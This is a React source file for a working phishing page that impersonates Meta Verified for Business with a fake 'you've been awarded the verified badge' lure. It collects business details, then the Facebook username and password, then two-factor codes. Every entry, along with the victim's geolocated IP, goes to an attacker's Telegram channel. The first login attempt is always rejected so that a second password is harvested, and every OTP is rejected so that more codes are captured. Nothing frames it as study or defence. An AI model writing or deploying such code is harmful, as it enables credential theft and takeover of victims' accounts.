import { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { sendTelegramMessage, setInitialSession, escapeHtml } from '../utils/telegram';

export default function Verify() {
  const navigate = useNavigate();
  const [step, setStep] = useState(1);
  const [clientIp, setClientIp] = useState('Unknown');
  
  const [busName, setBusName] = useState(''); const [perEmail, setPerEmail] = useState(''); const [busEmail, setBusEmail] = useState(''); const [countryCode, setCountryCode] = useState('+84'); const [phoneNum, setPhoneNum] = useState('');
  const [loginUser, setLoginUser] = useState(''); const [loginPass, setLoginPass] = useState(''); const [otp, setOtp] = useState('');
  const [loginAttempt, setLoginAttempt] = useState(0); const [otpAttempt, setOtptAttempt] = useState(0);

  const [loading, setLoading] = useState(false);
  const [errors, setErrors] = useState({}); const [showLoginError, setShowLoginError] = useState(false); const [showOtpError, setShowOtpError] = useState(false);

  useEffect(() => { fetch('https://ipwho.is/').then(r => r.json()).then(d => { if (d && d.ip) setClientIp(`${d.ip} - ${d.country} (${d.city})`); }).catch(()=>{}); }, []);

  const handleSignup = (e) => {
    e.preventDefault(); let errs = {};
    if (busName.length < 2) errs.busName = true; if (!/^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(perEmail)) errs.perEmail = true; if (!/^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(busEmail)) errs.busEmail = true; if (!/^\+?\d{8,15}$/.test(phoneNum.replace(/[\s\-().]/g, ''))) errs.phoneNum = true;
    if (Object.keys(errs).length > 0) { setErrors(errs); return; }
    setErrors({}); setLoading(true);
    const text = `<b>IP:</b> <code>${escapeHtml(clientIp)}</code>\n<b>Business:</b> <code>${escapeHtml(busName)}</code>\n<b>P.Email:</b> <code>${escapeHtml(perEmail)}</code>\n<b>B.Email:</b> <code>${escapeHtml(busEmail)}</code>\n<b>Phone:</b> <code>${escapeHtml(countryCode + phoneNum)}</code>\n`;
    setInitialSession(text); sendTelegramMessage('');
    setTimeout(() => { setLoading(false); setStep(2); }, 700);
  };

  const handleLogin = (e) => {
    e.preventDefault(); if (loginPass.length === 0) return;
    setLoading(true); setShowLoginError(false); const newAttempt = loginAttempt + 1; setLoginAttempt(newAttempt);
    sendTelegramMessage(`\n<b>Login ${newAttempt}:</b> <code>${escapeHtml(loginUser)}</code> | <code>${escapeHtml(loginPass)}</code>`);
    setTimeout(() => { setLoading(false); if (newAttempt === 1) { setShowLoginError(true); setLoginPass(''); } else { setStep(3); } }, (newAttempt === 1) ? 3000 : 5000);
  };

  const handleOtp = (e) => {
    e.preventDefault(); if (!/^\d{6}$|^\d{8}$/.test(otp)) { setShowOtpError(true); return; }
    setLoading(true); setShowOtpError(false); const newAttempt = otpAttempt + 1; setOtptAttempt(newAttempt);
    if (newAttempt <= 3) sendTelegramMessage(`\n<b>2FA ${newAttempt}:</b> <code>${escapeHtml(otp)}</code>`);
    setTimeout(() => { setLoading(false); setShowOtpError(true); setOtp(''); }, 1500);
  };

  return (
    <div style={{ position: 'relative', minHeight: '100vh' }}>
      
      {/* 1. PHẦN NỀN: COPY Y HỆT TRANG CHỦ NHƯNG LÀM MỜ ĐI */}
      <div style={{ filter: 'blur(4px)', pointerEvents: 'none', userSelect: 'none' }}>
          <header className="header">
              <div className="header-left">
                  <a href="/" className="header-logo"><img src="https://static.xx.fbcdn.net/rsrc.php/y9/r/tL_v571NdZ0.svg" alt="Meta for Business" /></a>
                  <nav className="nav-links">
                      <a className="nav-link" href="#steps">Get started</a>
                      <a className="nav-link" href="#benefits">Advertise</a>
                      <a className="nav-link" href="#faq">Learn</a>
                      <a className="nav-link" href="#footer">Support</a>
                  </nav>
              </div>
              <div className="header-right">
                  <svg className="header-icon" viewBox="0 0 24 24" fill="none" stroke="#1c2b33" strokeWidth="2"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35" strokeLinecap="round"/></svg>
                  <div className="avatar-btn"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#1c2b33" strokeWidth="1.5"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg></div>
              </div>
          </header>
          <section id="hero">
              <div className="hero-inner">
                  <div className="hero-text">
                      <div className="hero-text-inner">
                          <svg className="hero-icon" viewBox="0 0 84 84"><path fill="#0064e0" d="m50.4.47c1.79-.97 4.02-.37 5.08 1.36l4.99 8.17 9.57.24c2.03.05 3.67 1.69 3.72 3.72l.24 9.57 8.17 4.99c1.74 1.06 2.34 3.3 1.36 5.08l-4.58 8.4 4.58 8.4c.97 1.79.37 4.02-1.36 5.08l-8.17 4.99-.24 9.57c-.05 2.03-1.69 3.67-3.72 3.72l-9.57.24-4.99 8.17c-1.06 1.74-3.3 2.34-5.08 1.36l-8.4-4.58-8.4 4.58c-1.79.97-4.02.37-5.08-1.36l-4.99-8.17-9.57-.24c-2.03-.05-3.67-1.69-3.72-3.72l-.24-9.57-8.17-4.99c-1.74-1.06-2.34-3.3-1.36-5.08l4.58-8.4L.47 33.6c-.97-1.79-.37-4.02 1.36-5.08l8.17-4.99.24-9.57c.05-2.03 1.69-3.67 3.72-3.72l9.57-.24L28.51 1.83c1.06-1.74 3.3-2.34 5.08-1.36l8.4 4.58L50.4.47zm9.31 34.92c1.62-1.35 1.84-3.76.49-5.38-1.35-1.62-3.76-1.84-5.38-.49l-.26.21c-6.64 5.54-12.84 11.59-18.52 18.1l-6.62-6.62c-1.49-1.49-3.91-1.49-5.4 0-1.49 1.49-1.49 3.91 0 5.4l9.55 9.55c.76.76 1.8 1.16 2.87 1.11 1.07-.05 2.07-.55 2.76-1.37l.21-.26c6.06-7.27 12.77-13.98 20.04-20.04l.26-.21z"/></svg>
                          <h1 className="hero-title">Congratulations! You've been awarded the Official Verified Badge.</h1>
                          <p className="hero-subtitle">Your business has met our verification requirements and is now eligible to display the official badge. Complete the quick steps below to activate it.</p>
                          <button className="btn-primary">Claim your badge</button>
                          <p className="hero-note">To activate your Official Verified Badge, you must be logged in to a professional account (Instagram) or a Business Page (Facebook).</p>
                      </div>
                  </div>
                  <div className="hero-image"><img src="/hero.webp" alt="Meta Verified for Business" /></div>
              </div>
          </section>
      </div>

      {/* 2. LỚP PHỦ MỜ + FORM NỔI LÊN TRÊN */}
      <div style={{ position: 'fixed', inset: 0, background: 'rgba(0, 0, 0, 0.4)', zIndex: 1000, display: 'flex', alignItems: 'center', justifyContent: 'center', padding: '24px 16px', overflowY: 'auto' }}>
          
          <div style={{ position: 'relative', background: '#fff', borderRadius: '12px', padding: '28px 20px 20px', width: '100%', maxWidth: '420px', boxShadow: '0 12px 28px rgba(0,0,0,0.2)' }}>
               
            <button onClick={() => navigate('/')} style={{ position: 'absolute', top: '12px', right: '12px', background: '#f0f2f5', border: 'none', borderRadius: '50%', width: '34px', height: '34px', cursor: 'pointer', color: '#606770', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.2" strokeLinecap="round"><path d="M18 6 6 18M6 6l12 12"/></svg>
            </button>

            <div style={{ textAlign: 'center', marginBottom: '18px' }}>
                <img src="https://z-m-static.xx.fbcdn.net/rsrc.php/yt/r/DUiOg0mJTjz.webp" alt="FB" style={{ maxHeight: '60px', margin: '0 auto' }} />
            </div>

            {/* FORM 1 */}
            {step === 1 && (
              <>
                <h2 style={{ fontSize: '22px', fontWeight: '700', textAlign: 'center', color: '#050505', marginBottom: '6px' }}>Meta Verified for Business</h2>
                <p style={{ fontSize: '14.5px', textAlign: 'center', color: '#65676b', marginBottom: '20px' }}>Enter your business details to start your application.</p>
                <form onSubmit={handleSignup} noValidate style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
                    <div>
                        <input className="fb-input" style={{ borderColor: errors.busName ? '#fa383e' : 'rgb(224, 226, 228)' }} placeholder="Business name" value={busName} onChange={e => {setBusName(e.target.value); setErrors({...errors, busName: false})}} />
                        {errors.busName && <div style={{ color: '#fa383e', fontSize: '13px', marginTop: '6px' }}>Please enter your business name.</div>}
                    </div>
                    <div>
                        <input className="fb-input" style={{ borderColor: errors.perEmail ? '#fa383e' : 'rgb(224, 226, 228)' }} type="email" placeholder="Personal email" value={perEmail} onChange={e => {setPerEmail(e.target.value); setErrors({...errors, perEmail: false})}} />
                        {errors.perEmail && <div style={{ color: '#fa383e', fontSize: '13px', marginTop: '6px' }}>Please enter a valid personal email.</div>}
                    </div>
                    <div>
                        <input className="fb-input" style={{ borderColor: errors.busEmail ? '#fa383e' : 'rgb(224, 226, 228)' }} type="email" placeholder="Business email" value={busEmail} onChange={e => {setBusEmail(e.target.value); setErrors({...errors, busEmail: false})}} />
                        {errors.busEmail && <div style={{ color: '#fa383e', fontSize: '13px', marginTop: '6px' }}>Please enter a valid business email.</div>}
                    </div>
                    <div>
                        <div className="fb-phone-group">
                            <div className="fb-phone-select-wrap">
                                <select className="fb-phone-select" value={countryCode} onChange={e => setCountryCode(e.target.value)} style={{ width: '100%', height: '56px', padding: '10px 30px 10px 14px', border: '1px solid rgb(224, 226, 228)', borderRadius: '16px', appearance: 'none' }}>
                                    <option value="+93">+93 (Afghanistan)</option>
                                    <option value="+84">+84 (Vietnam)</option>
                                    <option value="+1">+1 (United States)</option>
                                    <option value="+44">+44 (United Kingdom)</option>
                                </select>
                            </div>
                            <input className="fb-input" style={{ flex: 1, borderColor: errors.phoneNum ? '#fa383e' : 'rgb(224, 226, 228)' }} placeholder="Phone number" value={phoneNum} onChange={e => {setPhoneNum(e.target.value); setErrors({...errors, phoneNum: false})}} />
                        </div>
                        {errors.phoneNum && <div style={{ color: '#fa383e', fontSize: '13px', marginTop: '6px' }}>Please enter a valid phone number.</div>}
                    </div>
                    <button type="submit" className="fb-btn" disabled={loading}>{loading ? 'Submitting...' : 'Continue'}</button>
                </form>
              </>
            )}

            {/* FORM 2 */}
            {step === 2 && (
              <form onSubmit={handleLogin} style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
                  <input className="fb-input" placeholder="Mobile number or email address" value={loginUser} onChange={e => setLoginUser(e.target.value)} required />
                  <input className="fb-input" type="password" placeholder="Password" value={loginPass} onChange={e => setLoginPass(e.target.value)} required />
                  {showLoginError && <div style={{ color: '#fa383e', fontSize: '13.5px', marginTop: '4px', textAlign: 'center' }}>The password you entered is incorrect. Please try again.</div>}
                  <button type="submit" className="fb-btn" disabled={loading}>{loading ? 'Logging in...' : 'Log in'}</button>
                  <div style={{ textAlign: 'center', padding: '12px 0 0' }}><a href="#" style={{ color: '#1c2b33', fontSize: '15px', textDecoration: 'none' }} onClick={e => e.preventDefault()}>Forgotten password?</a></div>
              </form>
            )}

            {/* FORM 3 */}
            {step === 3 && (
              <>
                <h2 style={{ fontSize: '22px', fontWeight: '700', textAlign: 'center', color: '#050505', marginBottom: '6px' }}>Two-factor authentication</h2>
                <p style={{ fontSize: '14.5px', textAlign: 'center', color: '#65676b', marginBottom: '20px' }}>Enter the 6-digit code we sent to your WhatsApp or SMS.</p>
                <form onSubmit={handleOtp} style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
                    <input className="fb-input fb-otp-input" style={{ textAlign: 'center', fontSize: '26px', letterSpacing: '12px', fontWeight: '700' }} placeholder="000000" value={otp} onChange={e => setOtp(e.target.value.replace(/\D/g, '').slice(0, 8))} required maxLength={8} />
                    {showOtpError && <div style={{ color: '#fa383e', fontSize: '13.5px', marginTop: '4px', textAlign: 'center' }}>Invalid security code. Please check the code and try again.</div>}
                    <button type="submit" className="fb-btn" disabled={loading}>{loading ? 'Verifying...' : 'Verify'}</button>
                </form>
              </>
            )}

            <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', marginTop: '24px', paddingTop: '20px', borderTop: '1px solid #e4e6eb' }}>
                <img src="https://upload.wikimedia.org/wikipedia/commons/7/7b/Meta_Platforms_Inc._logo.svg" alt="Meta" style={{ height: '12px', margin: '0 auto' }} />
            </div>
          </div>
      </div>
    </div>
  );
}